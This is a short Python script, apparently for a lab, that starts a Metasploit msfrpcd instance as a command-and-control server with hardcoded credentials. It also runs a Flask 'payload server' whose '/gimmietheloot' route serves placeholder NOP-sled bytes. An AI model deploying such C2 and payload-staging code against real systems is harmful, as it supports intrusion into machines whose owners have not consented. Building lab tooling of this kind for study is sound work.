import subprocess
from time import sleep
from flask import Flask


app = Flask(__name__)

HOST_ADDR = "192.168.56.3"
C2_PORT = "55552"
BYTE_PORT = "5020"

# define a single route

@app.route('/gimmietheloot')
def server():
    buf = b""
    buf = b"\x90" * 20

    return buf


if __name__ == '__main__':
    # start msfrpcd and send it an inputprint
    print("[+] Launching msfrpcd C2 server \n")
    msfrpcd = subprocess.Popen(['msfrpcd', "-f", "-a", HOST_ADDR, "-p", C2_PORT, "-U", "admin", '-P', 'hehehe'], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
    msfrpcd.stdin.write(b'no\n')
    msfrpcd.stdin.flush()
    sleep(1)
    #output = msfrpcd.stdout.read()
    #print(output)


    print("\n[+] Starting payload Server \n")
    # start Flask app
    app.run(host=HOST_ADDR, port=BYTE_PORT)
    # stop msfrpcd when Flask app is shut down
    msfrpcd.kill()